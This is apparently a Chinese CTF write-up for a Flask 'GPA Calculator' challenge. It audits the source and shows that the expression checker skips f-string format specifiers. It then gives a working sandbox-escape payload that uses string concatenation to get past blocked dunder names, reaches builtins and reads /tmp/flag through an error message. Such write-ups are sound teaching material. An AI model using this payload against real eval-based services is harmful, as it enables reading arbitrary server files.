# GPA Calculator

题目描述称：

```
小 r 非常“喜欢”吉吉大学的绩点制度，其拥有非常 amazing 的小数点“不四舍五入”机制，总是能意想不到的给予自己一些“惊喜”
为此，初学 Python 的他写了一个绩点计算器部署到服务器上，这个小工具支持手动录入成绩、导入 xlsx 成绩单，还能自定义成绩报告的显示格式
不过为了防止大家乱写表达式，小 r “认真”加了一套检查器（？
你能找出其中的漏洞吗？
```

能注意到题目是个 gpa 计算器的网页，检查器大概是重点

## 审计代码

附件解压后可以看到一个 Flask 写的 GPA Calculator 项目

`Dockerfile` 用来构建题目环境，安装 Flask、gunicorn、defusedxml 等依赖，并以非 root 用户运行服务。启动命令为：

```dockerfile
CMD ["gunicorn", "--config", "gunicorn.conf.py", "app:create_app()"]
```

说明 Web 入口在 `app.py` 的 `create_app()`

`entrypoint.sh` ：

```sh
flag_value=$FLAG
unset FLAG

umask 077
printf '%s' "$flag_value" > /tmp/flag
```

可以看到容器启动时会把环境变量 `FLAG` 写入 `/tmp/flag`，并且随后清空环境变量。因此后续目标应该是想办法读取 `/tmp/flag`

`compose.yml` 是本地测试用的 Docker Compose 配置，开放 `3000` 端口

`app.py` ：

Flask 主入口，定义了几个路由：

```python
@app.get("/")
def index():
    return render_template("index.html", default_expression=DEFAULT_EXPRESSION)
```

首页会渲染前端页面，并传入一个默认表达式：

```python
DEFAULT_EXPRESSION = 'f"加权 GPA：{gpa:.2f}\\n平均分：{avg_score:.2f}\\n总学分：{credits:.1f}\\n课程数：{course_count}"'
```

这说明题目的“自定义成绩报告”本质上是让用户提交一段 Python 表达式

继续看 `/api/calculate`：

```python
@app.post("/api/calculate")
def calculate():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return jsonify({"ok": False, "error_type": "BadRequest", "error": "json object required"}), 400

    try:
        courses = validate_courses(data.get("courses"))
        expression = data.get("expression") or DEFAULT_EXPRESSION
        summary = calculate_summary(courses)
        context = build_expression_context(summary)
    except ValueError as exc:
        return jsonify({"ok": False, "error_type": "BadRequest", "error": str(exc)}), 400

    result = run_expression(expression, context)
    status = 200 if result["ok"] else 400
    return jsonify({"courses": courses, "summary": summary, **result}), status
```

这里会接收用户提交的课程数据和 `expression`，先计算 GPA，再把表达式交给 `run_expression()` 执行

`gpa.py` ：

负责 GPA 业务计算，包括课程校验、成绩转绩点、加权平均等，比如：

```python
GRADE_POINTS = {
    "优秀": 4.0,
    "良好": 3.3,
    "中等": 2.3,
    "及格": 1.3,
    "不及格": 0.0
}

GRADE_SCORES = {
    "优秀": 95.0,
    "良好": 85.0,
    "中等": 75.0,
    "及格": 65.0,
    "不及格": 0.0,
}
```

`build_expression_context()` 会把计算结果整理成表达式能使用的变量：

```python
def build_expression_context(summary):
    return {
        "gpa": float(summary["gpa"]),
        "avg_score": float(summary["avg_score"]),
        "credits": float(summary["credits"]),
        "course_count": int(summary["course_count"]),
        "student_name": "guest",
    }
```

也就是说，正常情况下表达式里只能直接使用 `gpa`、`avg_score`、`credits`、`course_count`、`student_name` 这些变量

`xlsx_import.py` ：

负责解析上传的 xlsx 成绩单，它会读取表格中的课程名、学分、成绩等字段，然后转换成课程列表

这里虽然代码比较长，但主要是业务功能，用来支持题目描述中的“导入 xlsx 成绩单”

`runner.py` ：

```python
def run_expression(expression, context):
    try:
        tree = parse_and_check(expression, context.keys())
        code = compile(tree, "<report>", "eval")
        namespace = dict(context)
        namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
        value = eval(code, {"__builtins__": {}}, namespace)
        return {"ok": True, "result": str(value)[:MAX_OUTPUT]}
    except ExpressionRejected as exc:
        return {"ok": False, "error_type": "Rejected", "error": str(exc)}
    except Exception as exc:
        return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

这里流程非常直接：

1. 先调用 `parse_and_check()` 检查表达式
2. 检查通过后 `compile()`
3. 构造执行命名空间
4. 额外加入一个 `report` 对象
5. 最后用 `eval()` 执行

虽然 `eval()` 的全局变量中传入了空的 `__builtins__` ：

```python
eval(code, {"__builtins__": {}}, namespace)
```

但只要能通过对象链重新摸到 Python 的全局变量或内置函数，仍然有机会逃逸

而 `report.py` 中定义了被注入的 `ReportFormatter` ：

```python
class ReportFormatter:
    def __init__(self, student="guest"):
        self.student = student
```

这个类本身看起来只是用于渲染报告，但因为 `runner.py` 把它的实例放进了表达式环境：

```python
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

所以表达式里可以访问 `report` 这个对象，Python 中函数对象通常可以通过 `__globals__` 访问其定义时所在模块的全局命名空间，因此 `report` 很可能会成为后续利用的突破口

最后看真正的检查器 `checker.py` ：

```python
MAX_EXPRESSION_LENGTH = 2048

BLOCK_WORDS = (
    "__globals__",
    "__builtins__",
    "__subclasses__",
    "__import__",
)
```

首先它限制了表达式长度，并且过滤了几个比较敏感的字符串

这里直接写 `__globals__` 、`__builtins__` 、`__subclasses__` 、`__import__` 都会被拦掉

继续看允许的 AST 节点：

```python
ALLOWED_NODES = {
    ast.Expression,
    ast.Constant,
    ast.Name,
    ast.Load,
    ast.JoinedStr,
    ast.FormattedValue,
    ast.BinOp,
    ast.UnaryOp,
    ast.Add,
    ast.Sub,
    ast.Mult,
    ast.Div,
    ast.FloorDiv,
    ast.Mod,
    ast.Pow,
    ast.UAdd,
    ast.USub,
}
```

这里可以发现，`Call` 、`Attribute` 、`Subscript` 都不在白名单里，也就是说，正常情况下不能调用函数，不能访问属性，也不能用下标取值

比如类似下面的表达式都应该无法通过检查：

```python
open("/tmp/flag").read()
```

```python
report.__init__
```

因为它们分别会产生 `Call`、`Attribute` 这类 AST 节点

再看具体的检查逻辑：

```python
class ReportExpressionChecker(ast.NodeVisitor):
    def __init__(self, allowed_names):
        self.allowed_names = set(allowed_names)

    def visit(self, node):
        if type(node) not in ALLOWED_NODES:
            raise ExpressionRejected(f"{type(node).__name__} is not allowed")
        return super().visit(node)

    def visit_Name(self, node):
        if node.id not in self.allowed_names:
            raise ExpressionRejected(f"name {node.id!r} is not available")

    def visit_Constant(self, node):
        if not isinstance(node.value, (int, float, str)):
            raise ExpressionRejected(f"constant {node.value!r} is not allowed")

    def visit_FormattedValue(self, node):
        self.visit(node.value)
```

`visit()` 会检查节点类型是否在白名单里，`visit_Name()` 会检查变量名是否在允许列表中

在 `runner.py` 中调用检查器时：

```python
tree = parse_and_check(expression, context.keys())
```

这里传入的 `allowed_names` 来自 `context.keys()` ，也就是：

```
gpa
avg_score
credits
course_count
student_name
```

注意此时 `report` 还没有被加入允许列表。`report` 是检查完成之后才加入执行命名空间的：

```python
namespace = dict(context)
namespace["report"] = ReportFormatter(context.get("student_name", "guest"))
```

所以正常情况下，表达式中直接写 `report` 也应该被拦住

继续看最关键的地方：

```python
def visit_FormattedValue(self, node):
    self.visit(node.value)
```

这里是漏洞点

## 漏洞分析

在 Python 的 f-string 里，`{}` 中的内容会被解析成 `FormattedValue` ，例如：

```python
f"{gpa:.2f}"
```

其中 `gpa` 是要格式化的值，`.2f` 是格式说明符，也就是 `format_spec`

对于更复杂的 f-string，格式说明符里面也可以嵌入表达式，例如：

```python
f"{gpa:{'.2f'.strip()}}"
```

这里外层要格式化的是 `gpa` ，但是格式说明符里面又执行了：

```python
'.2f'.strip()
```

也就是说，f-string 的 `format_spec` 里同样可以出现表达式

但是题目中的检查器只检查了：

```python
self.visit(node.value)
```

也就是只检查了被格式化的主体，没有继续检查 `node.format_spec`

因此如果把危险表达式藏到 `format_spec` 里面，AST 检查器就看不到它

可以先用一个简单表达式验证：

```python
f"{gpa:{'.2f'.strip()}}"
```

这条表达式中，`'.2f'.strip()` 明显包含函数调用和属性访问，正常来说应该被 `Call` 和 `Attribute` 拦住。但由于它位于 `format_spec` 中，没有被检查器访问，所以可以正常执行

接下来就可以把利用点放进 `format_spec` 里

目标是读取 `/tmp/flag` ，前面已经看到 `runner.py` 会在运行时加入一个 `report` 对象：

```python
namespace["report"] = ReportFormatter(...)
```

而 `report` 是 `ReportFormatter` 的实例，可以通过它的方法对象继续拿到函数全局变量，正常思路是：

```python
report.__init__.__globals__
```

但是直接写会被黑名单中的 `__globals__` 拦住，所以需要字符串拼接绕过：

```python
'__glo' + 'bals__'
```

由于不能直接写 `report.__init__.__globals__` ，可以使用函数对象自带的 `__getattribute__` 方法取属性：

```python
report.__init__.__getattribute__('__glo' + 'bals__')
```

拿到 globals 之后，再取 `__builtins__` ，同样因为 `__builtins__` 被黑名单拦住，所以继续拼接：

```python
['__buil' + 'tins__']
```

再从 builtins 中取 `open` ，这里也可以拼接一下：

```python
['op' + 'en']
```

于是读取 flag 的核心表达式为：

```python
report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()
```

但是这段表达式不能直接放在外层，因为外层会被 AST 检查器检查。我们需要把它塞进 f-string 的 `format_spec` 里：

```python
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

这条 payload 的结构是：

```python
f"{0:{payload}}"
```

外层真正被格式化的值是 `0` ，检查器只会检查这个 `0` ，它是一个普通常量，可以通过

而里面的 `payload` 位于 `format_spec` ，不会被检查器访问，但运行时仍然会被 Python 执行

执行后，`/tmp/flag` 的内容会被当成格式说明符。由于 flag 显然不是合法的格式说明符，所以会触发异常，例如：

```
Invalid format specifier 'flag{fake_for_local_test}' for object of type 'int'
```

题目会把异常信息返回给前端：

```python
except Exception as exc:
    return {"ok": False, "error_type": exc.__class__.__name__, "error": str(exc)[:MAX_OUTPUT]}
```

因此 flag 会通过报错信息回显出来

最终 payload：

```
f"{0:{report.__init__.__getattribute__('__glo'+'bals__')['__buil'+'tins__']['op'+'en']('/tmp/flag').read()}}"
```

flag：

```
[ValueError] Invalid format specifier 'SpiritCTF{VISlt_F0rMATTEDvALu3-fORGoT_FoRm4T-SPec1b9d}' for object of type 'int'
```
